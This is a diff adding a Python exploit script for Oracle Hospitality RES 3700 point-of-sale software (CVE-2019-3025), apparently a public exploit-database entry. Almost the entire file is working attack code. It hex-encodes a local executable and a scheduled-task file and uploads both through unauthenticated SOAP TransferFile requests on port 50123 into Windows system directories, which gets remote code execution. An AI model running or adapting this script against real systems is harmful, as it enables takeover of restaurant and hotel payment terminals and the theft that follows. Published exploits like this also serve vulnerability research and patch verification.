@@ -1,0 +1,65 @@
+# Exploit Title: Oracle Hospitality RES 3700 5.7 - Remote Code Execution
+# Date: 2019-10-01
+# Exploit Author: Walid Faour
+# Vendor Homepage: https://www.oracle.com/industries/food-beverage/products/res-3700/
+# Software Link: N/A (Available to customers)
+# Version: <= v5.7
+# Tested on: Windows Server 2003 / Windows Server 2008
+# CVE : CVE-2019-3025
+
+#!/usr/bin/env python
+
+#Author: Walid Faour
+#Date: Aug. 2, 2019
+#Oracle Hospitality RES 3700 Release 4.9 Exploit
+
+import binascii
+import requests
+
+print
+print '-------------------------------------------------'
+print 'Oracle Hospitality RES 3700 Release 4.9 - Exploit'
+print '-------------------------------------------------'
+print
+
+IP = raw_input("Enter the IP address: ")
+URL = "http://" + IP + ":50123"
+
+f = open("attacker-4.9.exe",'rb')
+raw_payload = f.read()
+payload_hex = binascii.hexlify(raw_payload)
+f.close()
+
+g = open("attacker-4.9.job",'rb')
+raw_task = g.read()
+scheduled_task_hex = binascii.hexlify(raw_task)
+g.close()
+
+def exploit_body(data,full_path):
+	body = '<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/"> \
+			<SOAP-ENV:Body xmlns:MCRS-ENV="MCRS-URI"> \
+				<MCRS-ENV:Service>MDSSYSUTILS</MCRS-ENV:Service> \
+				<MCRS-ENV:Method>TransferFile</MCRS-ENV:Method> \
+				<MCRS-ENV:SessionKey>Session</MCRS-ENV:SessionKey> \
+				<MCRS-ENV:InputParameters> \
+					<dst>' + full_path + '</dst> \
+					<fn>' + full_path + '</fn> \
+					<data>' + data + '</data> \
+				</MCRS-ENV:InputParameters> \
+			</SOAP-ENV:Body> \
+		</SOAP-ENV:Envelope>'
+	return body
+def exploit_headers(body):
+	headers = {
+		"Content-Type" : "text/xml",
+		"User-Agent" : "MDS POS Client",
+		"Host" : IP + ":50123",
+		"Content-Length" : str(len(body)),
+		"Connection" : "Keep-Alive"
+	}
+	return headers
+print 'Exploiting Oracle Hospitality RES 3700 at IP address ' + IP + '...'
+body_payload = exploit_body(payload_hex,"C:\\Windows\\System32\\attacker-4.9.exe")
+body_task = exploit_body(scheduled_task_hex,"C:\\Windows\\Tasks\\attacker-4.9.job")
+send_payload = requests.post(URL,data=body_payload,headers=exploit_headers(body_payload))
+send_task = requests.post(URL,data=body_task,headers=exploit_headers(body_task))
